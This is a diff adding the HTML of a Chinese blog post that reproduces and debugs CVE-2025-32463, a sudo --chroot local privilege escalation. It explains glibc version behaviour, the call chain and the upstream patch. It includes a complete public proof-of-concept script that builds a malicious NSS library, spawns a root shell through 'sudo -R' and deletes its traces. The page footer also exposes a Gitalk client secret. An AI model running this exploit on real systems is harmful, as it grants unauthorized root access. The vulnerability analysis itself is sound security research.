@@ -1,0 +1,240 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CVE-2025-32463漏洞复现 | Small Utopia</title><meta name="author" content="Eutopia"><meta name="copyright" content="Eutopia"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="尝试复现并分析调试今年的一个 sudo 本地提权漏洞。该漏洞描述如下：  Sudo before 1.9.17p1 allows local users to obtain root access because &#x2F;etc&#x2F;nsswitch.conf from a user-controlled directory is used with the –chroot option">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2025-32463漏洞复现">
+<meta property="og:url" content="https://eknight-eutopia.github.io/posts/ec600fa5.html">
+<meta property="og:site_name" content="Small Utopia">
+<meta property="og:description" content="尝试复现并分析调试今年的一个 sudo 本地提权漏洞。该漏洞描述如下：  Sudo before 1.9.17p1 allows local users to obtain root access because &#x2F;etc&#x2F;nsswitch.conf from a user-controlled directory is used with the –chroot option">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://eknight-eutopia.github.io/img/cover/default_cover%20(20).jpg">
+<meta property="article:published_time" content="2025-12-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-19T04:29:17.069Z">
+<meta property="article:author" content="Eutopia">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://eknight-eutopia.github.io/img/cover/default_cover%20(20).jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://eknight-eutopia.github.io/posts/ec600fa5.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        if (name && globalFn[key][name]) return
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?b2bb076b3ca994b59d55f4681f7e3427";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CVE-2025-32463漏洞复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-12-19 12:29:17'
+}</script><link rel="stylesheet" href="/config/css/transparancy.css"><link rel="stylesheet" href="/config/css/edit-icon-anime.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">114</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-blog"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/sitetime"><i class="fa-fw fas fa-hourglass-end"></i><span> 时间轴</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw far fa-paper-plane"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Small Utopia</span></a><a class="nav-page-title" href="/"><span class="site-name">CVE-2025-32463漏洞复现</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-blog"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/sitetime"><i class="fa-fw fas fa-hourglass-end"></i><span> 时间轴</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw far fa-paper-plane"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2025-32463漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-17T16:00:00.000Z" title="发表于 2025-12-18 00:00:00">2025-12-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-19T04:29:17.069Z" title="更新于 2025-12-19 12:29:17">2025-12-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">934</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>尝试复现并分析调试今年的一个 sudo 本地提权漏洞。<br>该漏洞描述如下：</p>
+<blockquote>
+<p>Sudo before 1.9.17p1 allows local users to obtain root access because &#x2F;etc&#x2F;nsswitch.conf from a user-controlled directory is used with the –chroot option.</p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>建议环境 glibc 版本 &gt; 2.35，否则无法复现。<br>git clone sudo 的源码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sudo-project/sudo.git</span><br><span class="line">cd sudo</span><br><span class="line">git checkout v1.9.16p2</span><br></pre></td></tr></table></figure>
+<p>编译：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make -j$(nproc)</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<p>make install 会安装到 <code>/usr/local/bin</code> ，先将原来的 <code>/usr/bin/sudo</code> 重命名一下。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudo-chwoot.sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">                 @ Stratascale Cyber Research Unit (CRU)</span></span><br><span class="line">STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)</span><br><span class="line">cd $&#123;STAGE?&#125; || exit 1</span><br><span class="line"></span><br><span class="line">cat &gt; woot1337.c&lt;&lt;EOF</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) void woot(void) &#123;</span><br><span class="line">  setreuid(0,0);</span><br><span class="line">  setregid(0,0);</span><br><span class="line">  chdir(&quot;/&quot;);</span><br><span class="line">  execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">mkdir -p woot/etc libnss_</span><br><span class="line">echo &quot;passwd: /woot1337&quot; &gt; woot/etc/nsswitch.conf</span><br><span class="line">cp /etc/group woot/etc</span><br><span class="line">gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c</span><br><span class="line"></span><br><span class="line">echo &quot;woot!&quot;</span><br><span class="line">sudo -R woot woot</span><br><span class="line">rm -rf $&#123;STAGE?&#125; ##清理痕迹</span><br></pre></td></tr></table></figure>
+<p>分为三部分：</p>
+<ul>
+<li>创建 woot&#x2F;etc 目录并填充内容 woot&#x2F;etc&#x2F;nsswitch.conf 以及 &#x2F;etc&#x2F;group；</li>
+<li>编译 woot1337.c 为恶意共享库，令后续 sudo 运行时加载该库；</li>
+<li>sudo -R 触发</li>
+</ul>
+<p>运行网上的 exp.sh，没成功 XD。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eutopia@eutopia-ubuntu22 ~/Vulns/Linux_Kernel/cve-2025-32463</span><br><span class="line">base ❯ sudo -R woot woot</span><br><span class="line">Sorry, try again.</span><br><span class="line">Sorry, try again.</span><br><span class="line">sudo: 3 incorrect password attempts</span><br></pre></td></tr></table></figure>
+<h2 id="调试复现"><a href="#调试复现" class="headerlink" title="调试复现"></a>调试复现</h2><p>调试发现是在 <code>resolve_cmnd</code> 函数内 <code>nss_database_check_reload_and_get</code> 函数逻辑在 427 行增加了 check 逻辑。这里如果发现 local 与 str 的变量的ino不同，则设置 reload 为 false。</p>
+<img src="/posts/null/file-20251219111717636.png" class="">
+<img src="/posts/null/file-20251219111731697.png" class="">
+<p>glibc 2.35版本源码：</p>
+<img src="/posts/null/file-20251219111155604.png" class="">
+<p>在glibc 2.39中则将该check逻辑放入 if (local-&gt;data.services[database_index] !&#x3D; NULL)中包裹。由于刚好我们这个漏洞触发路径上 local-&gt;data.services[database_index] &#x3D;&#x3D; NULL，所以能够绕过该检查机制：</p>
+<img src="/posts/null/file-20251219111657272.png" class="">
+<p>更换环境为 Ubuntu 24.04，验证成功</p>
+<img src="/posts/null/file-20251219113617946.png" class="">
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>具体流程为：</p>
+<ul>
+<li>设置 chroot 后 runchroot 变为非空，执行 pivot_root 函数进行 chroot；</li>
+<li>执行 resolve_cmnd 函数解析命令地址；</li>
+<li>unpivot_root 恢复根路径<br>问题出在 resolve_cmnd 函数中会调用 SetPerms 函数，其会调用 getgrouplist 函数，从而触发重载 <code>/etc/nsswitch.conf</code> 逻辑，此时已进行 chroot，所以会加载恶意构造的 nsswitch.conf 文件。<br>然后在上面源码中有一个很 trick 的点：<br>其实就是为什么会在 pivot_root 后会重载 nsswitch.conf，但是在 unpivot_root 后就没有进行重载。<br>第一部分上面已经有分析；第二部分是因为在 unpivot_root 后其 local-&gt;data.services[database_index] !&#x3D; NULL（此时database_index &#x3D; 2），然后且 local-&gt;root_ino 与 str 的不一致导致设置 local-&gt;data.reload_disabled 为1，从而不会再重载。</li>
+</ul>
+<p>然后就是在哪里加载的恶意 so 库，nsswitch.conf 设置了 <code>passwd: /woot1337</code> 该名称可以用作库的路径的一部分，即：libnss_&#x2F;woot1337.so.2.so:<br>调用链如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">policy_check -&gt; sudoers_policy_check -&gt; sudoers_check_cmnd</span><br><span class="line"><span class="meta prompt_">	-&gt; </span><span class="language-bash">sudoers_check_common</span> </span><br><span class="line"><span class="meta prompt_">		-&gt; </span><span class="language-bash">set_cmnd_path</span> </span><br><span class="line"><span class="meta prompt_">		-&gt; </span><span class="language-bash">check_user -&gt; sudo_auth_init -&gt; sudo_passwd_init -&gt; sudo_setspent -&gt; setspent</span></span><br><span class="line"><span class="meta prompt_">			-&gt; </span><span class="language-bash">setup -&gt; module_load</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>setspent函数用于打开 shadows 文件。<br>在 module_load 中会加载so库。</p>
+<h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>其 patch 代码如下：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- sudo-1.9.17/plugins/sudoers/sudoers.c       2025-06-12 12:12:38.000000000 -0500</span></span><br><span class="line"><span class="comment">+++ sudo/plugins/sudoers/sudoers.c      2025-06-10 11:27:57.493871502 -0500</span></span><br><span class="line"><span class="meta">@@ -1080,7 +1080,6 @@</span></span><br><span class="line"> int</span><br><span class="line"> set_cmnd_path(struct sudoers_context *ctx, const char *runchroot)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="deletion">-    struct sudoers_pivot pivot_state = SUDOERS_PIVOT_INITIALIZER;</span></span><br><span class="line">     const char *cmnd_in;</span><br><span class="line">     char *cmnd_out = NULL;</span><br><span class="line">     char *path = ctx-&gt;user.path;</span><br><span class="line"><span class="meta">@@ -1099,13 +1098,7 @@</span></span><br><span class="line">     if (def_secure_path &amp;&amp; !user_is_exempt(ctx))</span><br><span class="line">        path = def_secure_path;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    /* Pivot root. */</span></span><br><span class="line"><span class="deletion">-    if (runchroot != NULL) &#123;</span></span><br><span class="line"><span class="deletion">-       if (!pivot_root(runchroot, &amp;pivot_state))</span></span><br><span class="line"><span class="deletion">-           goto error;</span></span><br><span class="line"><span class="deletion">-    &#125;</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-    ret = resolve_cmnd(ctx, cmnd_in, &amp;cmnd_out, path);</span></span><br><span class="line"><span class="addition">+    ret = resolve_cmnd(ctx, cmnd_in, &amp;cmnd_out, path, runchroot);</span></span><br><span class="line">     if (ret == FOUND) &#123;</span><br><span class="line">        char *slash = strrchr(cmnd_out, &#x27;/&#x27;);</span><br><span class="line">        if (slash != NULL) &#123;</span><br><span class="line"><span class="meta">@@ -1122,14 +1115,8 @@</span></span><br><span class="line">     else</span><br><span class="line">        ctx-&gt;user.cmnd = cmnd_out;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    /* Restore root. */</span></span><br><span class="line"><span class="deletion">-    if (runchroot != NULL)</span></span><br><span class="line"><span class="deletion">-       (void)unpivot_root(&amp;pivot_state);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line">     debug_return_int(ret);</span><br><span class="line"> error:</span><br><span class="line"><span class="deletion">-    if (runchroot != NULL)</span></span><br><span class="line"><span class="deletion">-       (void)unpivot_root(&amp;pivot_state);</span></span><br><span class="line">     free(cmnd_out);</span><br><span class="line">     debug_return_int(NOT_FOUND_ERROR);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>直接简单粗暴删除了 pivot_root 逻辑。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html">CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://eknight-eutopia.github.io">Eutopia</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://eknight-eutopia.github.io/posts/ec600fa5.html">https://eknight-eutopia.github.io/posts/ec600fa5.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://eknight-eutopia.github.io" target="_blank">Small Utopia</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/cover/default_cover%20(20).jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/a582bbad.html" title="C/C++ Socket编程入门"><img class="cover" src="/img/cover/default_cover%20(24).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">C/C++ Socket编程入门</div></div><div class="info-2"><div class="info-item-1">在学习 LibFuzzer，需要了解一下如何通过 C 或者 C++ 与目标建立连接。 基本概念socket（套接字）用于建立两个或多个节点间的数据通信，分为服务端和客户端。偷一张感觉比较清晰的图放在这里   例程以下是直接扒的示例程序，由C语言实现，暂时看这个以及上面的图就够用了 服务器端代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;int main()&#123;    // 创建套接字    int serv_sock = socket(AF_INET,...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">调试复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#patch"><span class="toc-number">4.</span> <span class="toc-text">patch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Eutopia</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const initGitalk = () => {
+    const gitalk = new Gitalk(Object.assign({
+      clientID: '4c4d7e363cc61fad04a9',
+      clientSecret: '93995fa6ff1a993b19e99287b2c362230cb33f11',
+      repo: 'eknight-eutopia.github.io',
+      owner: 'Eknight-Eutopia',
+      admin: ['Eknight-Eutopia'],
+      id: 'ab51dad84bb9c0cf5621fa4d773fcd88',
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  const loadGitalk = async() => {
+    if (typeof Gitalk === 'function') initGitalk()
+    else {
+      await btf.getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+      await btf.getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
+      initGitalk()
+    }
+  }
+  
+  const commentCount = n => {
+    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+    if (isCommentCount) {
+      isCommentCount.textContent= n
+    }
+  }
+
+  if ('Gitalk' === 'Gitalk' || !false) {
+    if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+    else loadGitalk()
+  } else {
+    window.loadOtherComment = loadGitalk
+  }
